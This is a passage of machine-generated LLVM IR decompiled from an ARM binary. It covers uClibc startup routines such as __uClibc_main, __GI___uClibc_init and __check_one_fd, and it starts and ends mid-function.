dec_label_pc_15b1c.dec_label_pc_15b1c_crit_edge:  ; preds = %dec_label_pc_15b1c
  %v0_15b1c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15b1c

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b1c
  %v0_15b34.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_15b34 = add i32 %v0_15b34.pre, 2008
  %v3_15b34 = inttoptr i32 %v2_15b34 to i32*
  %v4_15b34 = load i32, i32* %v3_15b34, align 4
  %v2_15b38 = icmp eq i32 %v4_15b34, 0
  br i1 %v2_15b38, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_15b30
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_15b30, %bb
  %v2_15b40 = xor i1 %v2_15b38, true
  call void @__pseudo_cond_branch(i1 %v2_15b40, i32 %v4_15b34)
  %v0_15b48 = load i32, i32* %r5.global-to-local, align 4
  %v2_15b48 = add i32 %v0_15b48, 2012
  %v3_15b48 = inttoptr i32 %v2_15b48 to i32*
  %v4_15b48 = load i32, i32* %v3_15b48, align 4
  %v2_15b4c = icmp eq i32 %v4_15b48, 0
  br i1 %v2_15b4c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_15b54 = xor i1 %v2_15b4c, true
  call void @__pseudo_cond_branch(i1 %v2_15b54, i32 %v4_15b48)
  %v2_15b58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15b58, i32* %r4.global-to-local, align 4
  %v1_15b5c = load i32, i32* @r0, align 4
  ret i32 %v1_15b5c

; uselistorder directives
  uselistorder i32 %v1_15b28, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_15b74 = load i32, i32* @r4, align 4
  %v6_15b74 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_15b88 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_15b90 = icmp eq i32 %v2_15b88, -1
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r3, align 4
  br i1 %v3_15b90, label %dec_label_pc_15b9c, label %dec_label_pc_15bb4

dec_label_pc_15b9c:                               ; preds = %entry
  %v0_15ba0 = load i32, i32* @r5, align 4
  %v2_15ba8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -33916), i32 %v0_15ba0)
  %v1_15bac = load i32, i32* @r4, align 4
  %v1_15bb0 = icmp ne i32 %v2_15ba8, %v1_15bac
  call void @__pseudo_cond_branch(i1 %v1_15bb0, i32 ptrtoint (i32* @global_var_146e8.689 to i32))
  br label %dec_label_pc_15bb4

dec_label_pc_15bb4:                               ; preds = %entry, %dec_label_pc_15b9c
  %v1_15bbc = phi i32 [ %v2_15b88, %entry ], [ %v2_15ba8, %dec_label_pc_15b9c ]
  store i32 %v3_15b74, i32* @r4, align 4
  store i32 %v6_15b74, i32* @r5, align 4
  ret i32 %v1_15bbc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_15bb4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15bc8 = load i32, i32* @r4, align 4
  store i32 %v3_15bc8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r4.global-to-local, align 4
  %v4_15bd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 148) to i32*), align 4
  %v1_15bdc = inttoptr i32 %v4_15bd8 to i32*
  %v2_15bdc = load i32, i32* %v1_15bdc, align 4
  %v2_15be0 = icmp eq i32 %v2_15bdc, 0
  br i1 %v2_15be0, label %dec_label_pc_15be8, label %dec_label_pc_15c0c

dec_label_pc_15be8:                               ; preds = %entry
  store i32 4096, i32* %v1_15bdc, align 4
  %v0_15bf0 = call i32 @__pthread_initialize_minimal()
  %v0_15bf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_15bf8 = add i32 %v0_15bf8, -49208
  %v2_15c00 = icmp eq i32 %v2_15bf8, 0
  br i1 %v2_15c00, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_15be8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_15be8, %bb
  %v2_15c08 = xor i1 %v2_15c00, true
  call void @__pseudo_cond_branch(i1 %v2_15c08, i32 %v2_15bf8)
  %v2_15c0c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %entry, %bb4
  %v2_15c0c = phi i32 [ %v2_15c0c.pre, %bb4 ], [ %v3_15bc8, %entry ]
  %.0 = phi i32 [ %v0_15bf0, %bb4 ], [ undef, %entry ]
  store i32 %v2_15c0c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c0c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 55180, i32* %r4.global-to-local, align 4
  %v1_15c2c = add i32 %tmp, 4
  store i32 %v1_15c2c, i32* %ip.global-to-local, align 4
  %v2_15c30 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r4.global-to-local, align 4
  %v3_15c3c = mul i32 %arg2, 4
  store i32 %v3_15c3c, i32* @r7, align 4
  %v4_15c44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 24) to i32*), align 4
  store i32 %v4_15c44, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_15c4c = add i32 %v1_15c2c, %v3_15c3c
  store i32 %v2_15c4c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %stack_var_-416, align 4
  %v4_15c54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 56) to i32*), align 4
  store i32 %v4_15c54, i32* %r4.global-to-local, align 4
  %v3_15c58 = icmp uge i32 %v2_15c4c, %v2_15c30
  store i1 %v3_15c58, i1* %cpsr_c.global-to-local, align 1
  %v9_15c58 = icmp eq i32 %v2_15c4c, %v2_15c30
  store i1 %v9_15c58, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_15c60 = inttoptr i32 %v4_15c54 to i32*
  store i32 %v2_15c4c, i32* %v2_15c60, align 4
  br i1 %v9_15c58, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_15c68 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c68 = load i32, i32* %r1.global-to-local, align 4
  %v2_15c68 = inttoptr i32 %v1_15c68 to i32*
  store i32 %v0_15c68, i32* %v2_15c68, align 4
  %v2_15c6c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15c6c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2012, i32* %r2.global-to-local, align 4
  %v0_15c78 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_15c78, i32* @r6, align 4
  br i1 %v9_15c58, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_15c8053 = add i32 %v2_15c6c, 2012
  %v4_15c8054 = inttoptr i32 %v3_15c8053 to i32*
  store i32 %arg6, i32* %v4_15c8054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_15c7c = load i32, i32* %ip.global-to-local, align 4
  %v2_15c7c = load i32, i32* @r7, align 4
  %v3_15c7c = add i32 %v2_15c7c, %v1_15c7c
  store i32 %v3_15c7c, i32* %r3.global-to-local, align 4
  %v3_15c8050 = add i32 %v2_15c6c, 2012
  %v4_15c8051 = inttoptr i32 %v3_15c8050 to i32*
  store i32 %arg6, i32* %v4_15c8051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_15c8c = load i32, i32* %r3.global-to-local, align 4
  %v2_15c8c = load i32, i32* %r4.global-to-local, align 4
  %v3_15c8c = inttoptr i32 %v2_15c8c to i32*
  store i32 %v1_15c8c, i32* %v3_15c8c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_15c90 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_15c90, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_15c98 = bitcast i32* %stack_var_-120 to i8*
  %v4_15c98 = call i32 @__GI_memset(i8* %v3_15c98, i32 0, i32 120)
  store i32 %v4_15c98, i32* %r0.global-to-local, align 4
  %v0_15c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_15c9c = inttoptr i32 %v0_15c9c to i32*
  %v2_15c9c = load i32, i32* %v1_15c9c, align 4
  br label %dec_label_pc_15ca8

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15ca8, %bb77
  %storemerge = phi i32 [ %v2_15c9c, %bb77 ], [ %v1_15cb4, %dec_label_pc_15ca8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_15ca8 = inttoptr i32 %storemerge to i32*
  %v2_15ca8 = load i32, i32* %v1_15ca8, align 4
  store i32 %v2_15ca8, i32* %r3.global-to-local, align 4
  %v2_15cac = icmp eq i32 %v2_15ca8, 0
  %v1_15cb4 = add i32 %storemerge, 4
  br i1 %v2_15cac, label %dec_label_pc_15cb4, label %dec_label_pc_15ca8

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15ca8
  store i32 %v1_15cb4, i32* @r4, align 4
  store i32 %v2_15c90, i32* @r5, align 4
  %v1_15cd830 = inttoptr i32 %v1_15cb4 to i32*
  %v2_15cd831 = load i32, i32* %v1_15cd830, align 4
  store i32 %v2_15cd831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15cdc33 = icmp eq i32 %v2_15cd831, 0
  store i1 %v2_15cdc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cdc33, label %dec_label_pc_15ce4, label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15cb4, %dec_label_pc_15cd8
  %v4_15cc8 = phi i32 [ %v1_15cd4, %dec_label_pc_15cd8 ], [ %v1_15cb4, %dec_label_pc_15cb4 ]
  %v5_15cc4 = phi i32 [ %v2_15cd8, %dec_label_pc_15cd8 ], [ %v2_15cd831, %dec_label_pc_15cb4 ]
  %v2_15cc0 = icmp ugt i32 %v5_15cc4, 13
  store i1 %v2_15cc0, i1* %cpsr_c.global-to-local, align 1
  %v7_15cc0 = icmp eq i32 %v5_15cc4, 14
  store i1 %v7_15cc0, i1* %cpsr_z.global-to-local, align 1
  %v2_15cc4 = xor i1 %v2_15cc0, true
  %v3_15cc4 = or i1 %v7_15cc0, %v2_15cc4
  br i1 %v3_15cc4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_15cc0
  %v4_15cc4 = load i32, i32* @r5, align 4
  %v6_15cc4 = and i32 %v5_15cc4, 536870912
  %v7_15cc4 = icmp ne i32 %v6_15cc4, 0
  store i1 %v7_15cc4, i1* %cpsr_c.global-to-local, align 1
  %v8_15cc4 = mul i32 %v5_15cc4, 8
  %v9_15cc4 = add i32 %v4_15cc4, %v8_15cc4
  store i32 %v9_15cc4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_15cc0, %bb78
  %v1_15cd0 = phi i1 [ %v2_15cc0, %dec_label_pc_15cc0 ], [ %v7_15cc4, %bb78 ]
  %v2_15cc8 = xor i1 %v1_15cd0, true
  %v3_15cc8 = or i1 %v7_15cc0, %v2_15cc8
  br i1 %v3_15cc8, label %bb80, label %dec_label_pc_15cd8

bb80:                                             ; preds = %bb79
  store i32 %v4_15cc8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_15cc8, i32 ptrtoint (i32* @global_var_12aa0.697 to i32))
  %v0_15cd4 = load i32, i32* @r4, align 4
  %v1_15cd4 = add i32 %v0_15cd4, 8
  store i32 %v1_15cd4, i32* @r4, align 4
  %v1_15cd8 = inttoptr i32 %v1_15cd4 to i32*
  %v2_15cd8 = load i32, i32* %v1_15cd8, align 4
  store i32 %v2_15cd8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15cdc = icmp eq i32 %v2_15cd8, 0
  store i1 %v2_15cdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cdc, label %dec_label_pc_15ce4, label %dec_label_pc_15cc0

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cd8, %dec_label_pc_15cb4
  store i32 %v2_15c90, i32* %r0.global-to-local, align 4
  %v1_15ce8 = call i32 @_dl_aux_init(i32 %v2_15c90)
  store i32 %v1_15ce8, i32* %r0.global-to-local, align 4
  %v1_15cec = call i32 @__GI___uClibc_init(i32 %v1_15ce8)
  store i32 %v1_15cec, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15cf4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15cf4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_15cfc = add i32 %v2_15cf4, 148
  %v3_15cfc = inttoptr i32 %v2_15cfc to i32*
  %v4_15cfc = load i32, i32* %v3_15cfc, align 4
  store i32 %v4_15cfc, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d04 = icmp eq i32 %tmp66, 0
  store i1 %v2_15d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d04, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15ce4
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15ce4, %bb81
  %v0_15d10 = phi i32 [ %tmp66, %dec_label_pc_15ce4 ], [ 4096, %bb81 ]
  %v3_15d0c = icmp eq i32 %tmp65, -1
  store i1 %v3_15d0c, i1* %cpsr_c.global-to-local, align 1
  %v8_15d0c = icmp eq i32 %tmp65, -1
  store i1 %v8_15d0c, i1* %cpsr_z.global-to-local, align 1
  %v2_15d10 = inttoptr i32 %v4_15cfc to i32*
  store i32 %v0_15d10, i32* %v2_15d10, align 4
  br i1 %v3_15d0c, label %dec_label_pc_15d18, label %dec_label_pc_15d40

dec_label_pc_15d18:                               ; preds = %bb82
  %v0_15d18 = call i32 @getuid()
  store i32 %v0_15d18, i32* @r0, align 4
  store i32 %v0_15d18, i32* %r4.global-to-local, align 4
  %v0_15d20 = call i32 @geteuid()
  store i32 %v0_15d20, i32* @r0, align 4
  %v3_15d24 = icmp uge i32 %v0_15d18, %v0_15d20
  store i1 %v3_15d24, i1* %cpsr_c.global-to-local, align 1
  %v9_15d24 = icmp eq i32 %v0_15d18, %v0_15d20
  store i1 %v9_15d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d24, label %dec_label_pc_15d2c, label %dec_label_pc_15d68

dec_label_pc_15d2c:                               ; preds = %dec_label_pc_15d18
  %v1_15d2c = call i32 @getgid(i32 %v0_15d20)
  store i32 %v1_15d2c, i32* @r0, align 4
  store i32 %v1_15d2c, i32* %r4.global-to-local, align 4
  %v0_15d34 = call i32 @getegid()
  store i32 %v0_15d34, i32* %r0.global-to-local, align 4
  %v3_15d38 = icmp uge i32 %v1_15d2c, %v0_15d34
  store i1 %v3_15d38, i1* %cpsr_c.global-to-local, align 1
  %v9_15d38 = icmp eq i32 %v1_15d2c, %v0_15d34
  store i1 %v9_15d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d38, label %dec_label_pc_15d40, label %dec_label_pc_15d68

dec_label_pc_15d40:                               ; preds = %dec_label_pc_15d2c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_15d0c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_15d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15d0c, label %dec_label_pc_15d90, label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d40
  store i32 %tmp64, i32* @r3, align 4
  %v3_15d50 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_15d50, i1* %cpsr_c.global-to-local, align 1
  %v9_15d50 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_15d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d50, label %dec_label_pc_15d58, label %dec_label_pc_15d68

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d4c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_15d60 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_15d60, i1* %cpsr_c.global-to-local, align 1
  %v9_15d60 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_15d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d60, label %dec_label_pc_15d90, label %dec_label_pc_15d68

dec_label_pc_15d68:                               ; preds = %dec_label_pc_15d4c, %dec_label_pc_15d2c, %dec_label_pc_15d18, %dec_label_pc_15d58
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_15d74 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_15d7c = load i32, i32* @r4, align 4
  store i32 %v0_15d7c, i32* %r1.global-to-local, align 4
  %v2_15d80 = call i32 @__check_one_fd(i32 1, i32 %v0_15d7c)
  %v0_15d84 = load i32, i32* @r4, align 4
  store i32 %v0_15d84, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15d8c = call i32 @__check_one_fd(i32 2, i32 %v0_15d84)
  store i32 %v2_15d8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d58, %dec_label_pc_15d40, %dec_label_pc_15d68
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_15d98 = load i32, i32* %arg3, align 4
  store i32 %v2_15d98, i32* %r2.global-to-local, align 4
  %v2_15d9c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15d9c, i32* %r1.global-to-local, align 4
  %v3_15da0 = add i32 %v2_15d9c, 260
  %v4_15da0 = inttoptr i32 %v3_15da0 to i32*
  store i32 %v2_15d98, i32* %v4_15da0, align 4
  %v0_15da4 = load i32, i32* %r0.global-to-local, align 4
  %v1_15da4 = inttoptr i32 %v0_15da4 to i32*
  %v2_15da4 = load i32, i32* %v1_15da4, align 4
  store i32 %v2_15da4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15da8 = icmp eq i32 %v2_15da4, 0
  store i1 %v2_15da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15da8, label %bb84, label %dec_label_pc_15db0

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15d90
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_15db4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15db4 = add i32 %v0_15db4, 164
  %v3_15db4 = inttoptr i32 %v2_15db4 to i32*
  %v4_15db4 = load i32, i32* %v3_15db4, align 4
  store i32 %v4_15db4, i32* %r3.global-to-local, align 4
  %v2_15db8 = inttoptr i32 %v4_15db4 to i32*
  store i32 %v2_15da4, i32* %v2_15db8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_15dc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_15dc0 = inttoptr i32 %v0_15dc0 to i32*
  %v2_15dc0 = load i32, i32* %v1_15dc0, align 4
  store i32 %v2_15dc0, i32* %r0.global-to-local, align 4
  %v4_15dc4 = call i32 @__GI_strrchr(i32 %v2_15dc0, i32 47, i32 %v2_15d98, i32 %v4_15db4)
  store i32 %v4_15dc4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_15dcc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15dcc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15dd0 = icmp eq i32 %v4_15dc4, 0
  store i1 %v2_15dd0, i1* %cpsr_z.global-to-local, align 1
  %v2_15dd4 = add i32 %v2_15dcc, 96
  %v3_15dd4 = inttoptr i32 %v2_15dd4 to i32*
  %v4_15dd4 = load i32, i32* %v3_15dd4, align 4
  store i32 %v4_15dd4, i32* %r2.global-to-local, align 4
  br i1 %v2_15dd0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_15db0
  %v2_15ddc58 = inttoptr i32 %v4_15dd4 to i32*
  store i32 0, i32* %v2_15ddc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_15db0
  %v2_15dd8 = add i32 %v4_15dc4, 1
  store i32 %v2_15dd8, i32* %r3.global-to-local, align 4
  %v2_15ddc = inttoptr i32 %v4_15dd4 to i32*
  store i32 %v4_15dc4, i32* %v2_15ddc, align 4
  %v1_15de0 = load i32, i32* %r3.global-to-local, align 4
  %v2_15de0 = load i32, i32* %r2.global-to-local, align 4
  %v3_15de0 = inttoptr i32 %v2_15de0 to i32*
  store i32 %v1_15de0, i32* %v3_15de0, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_15d90
  %v2_15df0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15df0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_15dfc = add i32 %v2_15df0, -12
  store i32 %v2_15dfc, i32* %r5.global-to-local, align 4
  store i32 2008, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_15e0c = add i32 %v2_15df0, 2008
  %v4_15e0c = inttoptr i32 %v3_15e0c to i32*
  store i32 %arg5, i32* %v4_15e0c, align 4
  %v0_15e2418 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e2419 = load i32, i32* %r7.global-to-local, align 4
  %v3_15e2421 = icmp uge i32 %v0_15e2418, %v1_15e2419
  store i1 %v3_15e2421, i1* %cpsr_c.global-to-local, align 1
  %v9_15e2427 = icmp eq i32 %v0_15e2418, %v1_15e2419
  store i1 %v9_15e2427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e2421, label %dec_label_pc_15e58.lr.ph, label %dec_label_pc_15e14

dec_label_pc_15e14:                               ; preds = %bb84, %dec_label_pc_15e14
  %v1_15e14 = phi i32 [ %v1_15e20, %dec_label_pc_15e14 ], [ %v0_15e2418, %bb84 ]
  %v0_15e14 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e14 = and i32 %v1_15e14, 1073741824
  %v3_15e14 = icmp ne i32 %v2_15e14, 0
  store i1 %v3_15e14, i1* %cpsr_c.global-to-local, align 1
  %v4_15e14 = mul i32 %v1_15e14, 4
  %v5_15e14 = add i32 %v4_15e14, %v0_15e14
  %v6_15e14 = inttoptr i32 %v5_15e14 to i32*
  %v7_15e14 = load i32, i32* %v6_15e14, align 4
  store i32 %v7_15e14, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15e14)
  %v0_15e20 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e20 = add i32 %v0_15e20, 1
  store i32 %v1_15e20, i32* %r4.global-to-local, align 4
  %v1_15e24 = load i32, i32* %r7.global-to-local, align 4
  %v3_15e24 = icmp uge i32 %v1_15e20, %v1_15e24
  store i1 %v3_15e24, i1* %cpsr_c.global-to-local, align 1
  %v9_15e24 = icmp eq i32 %v1_15e20, %v1_15e24
  store i1 %v9_15e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e24, label %dec_label_pc_15e58.lr.ph, label %dec_label_pc_15e14

dec_label_pc_15e58.lr.ph:                         ; preds = %dec_label_pc_15e14, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e2c = icmp eq i32 %v0_15c78, 0
  store i1 %v2_15e2c, i1* %cpsr_z.global-to-local, align 1
  %v2_15e34 = xor i1 %v2_15e2c, true
  call void @__pseudo_cond_branch(i1 %v2_15e34, i32 %v0_15c78)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_15e40 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_15e4c = add i32 %v2_15e40, -12
  store i32 %v2_15e4c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15e58

dec_label_pc_15e58:                               ; preds = %dec_label_pc_15e58.dec_label_pc_15e58_crit_edge, %dec_label_pc_15e58.lr.ph
  %v1_15e58 = phi i32 [ %v1_15e64, %dec_label_pc_15e58.dec_label_pc_15e58_crit_edge ], [ 0, %dec_label_pc_15e58.lr.ph ]
  %v0_15e58 = phi i32 [ %v0_15e58.pre, %dec_label_pc_15e58.dec_label_pc_15e58_crit_edge ], [ %v2_15e4c, %dec_label_pc_15e58.lr.ph ]
  %v2_15e58 = and i32 %v1_15e58, 1073741824
  %v3_15e58 = icmp ne i32 %v2_15e58, 0
  store i1 %v3_15e58, i1* %cpsr_c.global-to-local, align 1
  %v4_15e58 = mul i32 %v1_15e58, 4
  %v5_15e58 = add i32 %v4_15e58, %v0_15e58
  %v6_15e58 = inttoptr i32 %v5_15e58 to i32*
  %v7_15e58 = load i32, i32* %v6_15e58, align 4
  store i32 %v7_15e58, i32* %ip.global-to-local, align 4
  store i32 89700, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_15e58)
  %v0_15e64 = load i32, i32* @r4, align 4
  %v1_15e64 = add i32 %v0_15e64, 1
  store i32 %v1_15e64, i32* @r4, align 4
  %v1_15e68 = load i32, i32* @r7, align 4
  %v3_15e68 = icmp uge i32 %v1_15e64, %v1_15e68
  store i1 %v3_15e68, i1* %cpsr_c.global-to-local, align 1
  %v9_15e68 = icmp eq i32 %v1_15e64, %v1_15e68
  store i1 %v9_15e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e68, label %dec_label_pc_15e70, label %dec_label_pc_15e58.dec_label_pc_15e58_crit_edge

dec_label_pc_15e58.dec_label_pc_15e58_crit_edge:  ; preds = %dec_label_pc_15e58
  %v0_15e58.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15e58

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e58
  %v2_15e74.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15e74.pre, i32* %r0.global-to-local, align 4
  %v2_15e78 = add i32 %v2_15e74.pre, -67968
  store i32 %v2_15e78, i32* %r2.global-to-local, align 4
  store i32 %v2_15e78, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e80 = icmp eq i32 %v2_15e78, 0
  store i1 %v2_15e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e80, label %dec_label_pc_15e98, label %dec_label_pc_15e88

dec_label_pc_15e88:                               ; preds = %dec_label_pc_15e70
  store i32 89744, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_15e78)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15e94 = load i32, i32* %r0.global-to-local, align 4
  %v2_15e94 = inttoptr i32 %v1_15e94 to i32*
  store i32 0, i32* %v2_15e94, align 4
  %v2_15e9c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_15e98

